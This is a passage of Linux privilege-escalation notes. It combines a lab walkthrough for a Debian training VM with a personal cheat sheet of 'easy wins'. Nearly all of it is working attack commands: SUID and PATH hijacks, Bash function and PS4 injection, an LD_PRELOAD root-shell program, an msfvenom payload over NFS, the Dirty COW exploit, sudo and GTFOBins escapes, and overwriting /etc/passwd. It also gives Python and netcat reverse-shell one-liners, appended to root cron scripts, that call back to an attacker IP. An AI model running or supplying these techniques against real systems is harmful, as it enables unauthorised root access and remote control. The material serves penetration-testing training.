<br>Run strace on the file and search the output for open/access calls and for "no such file" errors:
<br>strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
<br>Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.
<br>Create the .config directory for the libcalc.so file:
<br>mkdir /home/user/.config
<br>Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:
<br>gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
<br>Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.
<br>/usr/local/bin/suid-so
<br>
<br>
<br>SUID / SGID Executables - Environment Variables
<br>
<br>The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.
<br>First, execute the file and note that it seems to be trying to start the apache2 webserver:
<br>/usr/local/bin/suid-env
<br>Run strings on the file to look for strings of printable characters:
<br>strings /usr/local/bin/suid-env
<br>One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.
<br>Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
<br>gcc -o service /home/user/tools/suid/service.c
<br>Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
<br>PATH=.:$PATH /usr/local/bin/suid-env
<br>
<br>
<br>SUID / SGID Executables - Abusing Shell Features (#1)
<br>
<br>The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
<br>Verify this with strings:
<br>strings /usr/local/bin/suid-env2
<br>In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.
<br>Verify the version of Bash installed on the Debian VM is less than 4.2-048:
<br>/bin/bash --version
<br>Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
<br>function /usr/sbin/service { /bin/bash -p; }
<br>export -f /usr/sbin/service
<br>Run the suid-env2 executable to gain a root shell:
<br>/usr/local/bin/suid-env2
<br>
<br>
<br>SUID / SGID Executables - Abusing Shell Features (#2)
<br>
<br>Note: This will not work on Bash versions 4.4 and above.
<br>When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.
<br>Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
<br>env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
<br>Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
<br>/tmp/rootbash -p
<br>Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
<br>rm /tmp/rootbash
<br>exit
<br>
<br>
<br>
<br>Passwords & Keys - History Files
<br>
<br>If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
<br>View the contents of all the hidden history files in the user's home directory:
<br>cat ~/.*history | less
<br>Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
<br>Switch to the root user, using the password:
<br>su root
<br>
<br>
<br>Passwords & Keys - Config Files
<br>
<br>Config files often contain passwords in plaintext or other reversible formats.
<br>List the contents of the user's home directory:
<br>ls /home/user
<br>Note the presence of a myvpn.ovpn config file. View the contents of the file:
<br>cat /home/user/myvpn.ovpn
<br>The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
<br>su root
<br>
<br>
<br>Passwords & Keys - SSH Keys
<br>
<br>Sometimes users make backups of important files but fail to secure them with the correct permissions.
<br>Look for hidden files & directories in the system root:
<br>ls -la /
<br>Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
<br>ls -l /.ssh
<br>Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.
<br>Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
<br>chmod 600 root_key
<br>Use the key to login to the Debian VM as the root account (change the IP accordingly):
<br>ssh -i root_key root@10.10.10.10
<br>
<br>
<br>NFS
<br>
<br>Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
<br>Check the NFS share configuration on the Debian VM:
<br>cat /etc/exports
<br>Note that the /tmp share has root squashing disabled.
<br>On your Kali box, switch to your root user if you are not already running as root:
<br>sudo su
<br>Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):
<br>mkdir /tmp/nfs
<br>mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
<br>Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):
<br>msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
<br>Still using Kali's root user, make the file executable and set the SUID permission:
<br>chmod +xs /tmp/nfs/shell.elf
<br>Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
<br>/tmp/shell.elf
<br>
<br>
<br>Kernel Exploits
<br>
<br>Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
<br>Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
<br>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
<br>The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
<br>Compile the code and run it (note that it may take several minutes to complete):
<br>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
<br>./c0w
<br>Once the exploit completes, run /usr/bin/passwd to gain a root shell:
<br>/usr/bin/passwd
<br>Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!
<br>mv /tmp/bak /usr/bin/passwd
<br>exit
<br>
<br>
<br>Privilege Escalation Scripts
<br>
<br>Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: /home/user/tools/privesc-scripts
<br>
<br>
<br>Linux Privilege Escalation: Quick and Dirty
<br>Automated Tooling
<br>
<br>Usually, my approach is to use an automated tool in conjunction with some manual enumeration. However, you can completely accomplish the Privilege Escalation process from an automated tool paired with the right exploitation methodology.
<br>
<br>1. Linpeas.sh (my go-to, fully automated)
<br>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
<br>2. Linprivchecker.py (my backup)
<br>https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
<br>3. Linux-Exploit-Suggest-2.pl (To look for those sneaky little Kernel Exploits)
<br>https://github.com/jondonas/linux-exploit-suggester-2
<br>Resources
<br>
<br>Keep in mind, that these are just some of the techniques I have used. You’ll find that some of the existing Linux Privilege escalation guides are much more comprehensive:
<br>
<br>1. The Holy Grail
<br>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
<br>2. My Second Favorite Guide
<br>https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_inux.html__
<br>3. GTFOBins (The most comprehensive binary privesc guide)
<br>https://gtfobins.github.io/
<br>Techniques
<br>
<br>God Mode
<br>
<br>history
<br>
<br>I know, seems crazy, the history command? Why? Well, I’ve successfully performed privilege escalation from finding hints or credentials in the user’s history.
<br>
<br>Capabilities
<br>If there’s a capability that has a setuid+ep, the command might be able to be abused
<br>Example:
<br>/usr/bin/python2.6 = capsetuid+ep
<br>
<br>For instance, I used this cheat sheet for capability exploits
<br>ref: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/
<br>
<br>Changing WordPress Password via MySQL DB I came across a situation in which taking over the WordPress website was essentially in the privilege escalation process due to versioning.
<br>
<br>    Find MySQL credentials
<br>    Connect to the Localhost Database
<br>
<br>mysql -h localhost -u user -p
<br>
<br>    Authenticate using the credentials you found
<br>    Select the database that has the credentials table
<br>
<br>USE databasename;
<br>
<br>    Change the admin password or user’s password that you have access to
<br>
<br>UPDATE wp_users SET user_pass=PASSWORD('P@ssw0rd123!') WHERE user_login='wpadmin';
<br>
<br>    KEY: wp_users is the table, SET is for the user password field in the table, and where is for the user login field within the table.
<br>
<br>Permissive Root Script If a cron job is running a script as root, determine what the script is doing. If you have full permission to edit the script, you’re golden. Note: the » in the one-liner echo represents overwriting the file.
<br>
<br>Two of my favorite examples:
<br>
<br>Python One-Liner
<br>
<br>echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
<br>
<br>Bash One-Liner (If the script is a .sh)
<br>
<br>echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.10 7242 > /tmp/f" >> monitor.sh
<br>
<br>Now set up a listener on the defined port, and wait for the script to run.
<br>
<br>LD_Preload In some circumstances, you may be able to abuse certain services that run via LD_Preload.
<br>
<br>    Run:
<br>
<br>sudo -l
<br>
<br>    If env_keep+=LD+PRELOAD is seen:
<br>    Make a C script named “shell” or whatever you want
<br>
<br>nano shell.c
<br>
<br>    Place the following code in the script:
<br>
<br>    ```
<br>    \#include <stdio.h>
<br>       
<br>    \#include <sys/types.h>
<br>       
<br>    \#include <stdlib.h>
<br>       
<br>    void _init() {
<br>       
<br>    unsetenv("LD_PRELOAD");
<br>       
<br>    setgid(0);
<br>       
<br>    setuid(0);
<br>       
<br>    system("/bin/bash");
<br>       
<br>    }
<br>    ```
<br>
<br>    Compile the shell
<br>
<br>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
<br>
<br>    Take a look at what system services are being preloaded, for instance, if you see apache2 then you would do a sudo preload for apache2, escalating your current shell to a root level shell
<br>
<br>sudo LD_PRELOAD=/home/user/shell.so apache2
<br>
<br>Bash SUID This one absolutely blew my mind, I used it recently. If you find a private SSH Key, and you can log in with it: Check for a Bash SUID. If you have it, you might be able to escalate during authentication!
<br>
<br>ssh -i id_rsa user@ip bash -p
<br>
<br>Lua Privilege Escalation This is another one of those strange one-off scenarios. I had a script that allowed me to drop into a little command prompt and run different commands as root (but most of them would just print the word “nil”). I had no idea what was happening. After a little research, I found out that nil was Lua’s version of null (basically the error was telling me that it was attempting to use Lua commands but the commands used did not exist) and the prompt I was using was some sort of Lua Script. Jokingly, I typed the following:
<br>
<br>os.execute('/bin/sh')
<br>
<br>I was root!!
<br>
<br>Sudo Bypass
<br>
<br>I noticed the following entry [(ALL, !root) /bin/bash)] upon running:
<br>
<br>sudo -l 
<br>
<br>I had root permissions to run bash, an obvious win! Attempting to run it as the root user would not work. A quick google search helped me understand that it was a Sudo Privilege Escalation bypass:
<br>
<br>sudo -u#-1 /bin/bash
<br>
<br>Tar SUID
<br>If you find a Tar SUID assigned to your current user, it’s an easy win:
<br>
<br>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
<br>
<br>TMUX Session Running as Root
<br>I cannot express how many times this one has been overlooked. I’ve legitimately exploited 5+ systems in CTF-Like environments with this gem. If you see a TMUX session running as root, look at the path. Typically, I’ve seen the session running under /.devs/dev_sess
<br>
<br>This can be identified using:
<br>
<br>ps -aux | grep tmux
<br>
<br>If you see that, and a session is active as the root user, attempt an easy win:
<br>
<br>tmux -S /.devs/dev_sess
<br>
<br>If it works, check your privs! You might just be root.
<br>
<br>NMAP SUID
<br>Yes, another exceedingly simple win:
<br>
<br>nmap --interactive
<br>!sh
<br>
<br>Systemctl SUID
<br>Identifying this beauty represents yet another win
<br>
<br>Run each one of these commands in order:
<br>
<br>TF=$(mktemp).service
<br>
<br>echo '[Service]
<br>
<br>Type=oneshot
<br>
<br>ExecStart=/bin/sh -c "id > /tmp/output"
<br>
<br>[Install]
<br>
<br>WantedBy=multi-user.target' > $TF
<br>
<br>systemctl link $TF
<br>
<br>systemctl enable --now $TF
<br>
<br>Copy SUID
<br>
<br>Noticing the ‘cp’ command with SUID assigned to your user account could allow you to overwrite the passwd file of the victim system, giving yourself root permissions:
<br>
<br>    Open up a terminal in your attacking machine, create a salted password:
<br>
<br>openssl passwd -1 -salt roflroot pass123
<br>
<br>    Copy your attacking machine local passwd file to have something to edit:
<br>
<br>cp /etc/passwd /root/Exploits
<br>
<br>    Host HTTP Server:
<br>
<br>python -m SimpleHTTPServer 8000
<br>
<br>    Navigate to /tmp directory on the victim host machine or somewhere you have write permissions and download the passwd file:
<br>
<br>wget http://192.168.119.221:8000/passwd
<br>
<br>    Copy passwd file to /etc/passwd:
<br>
<br>cp passwd /etc/passwd
<br>
<br>    Switch to your created user:
<br>
<br>su roflroot
<br>
<br>I hope some of these techniques help you! If you liked my guide, be sure to follow me on Twitter: @johnjhacking
<br>
</h3>
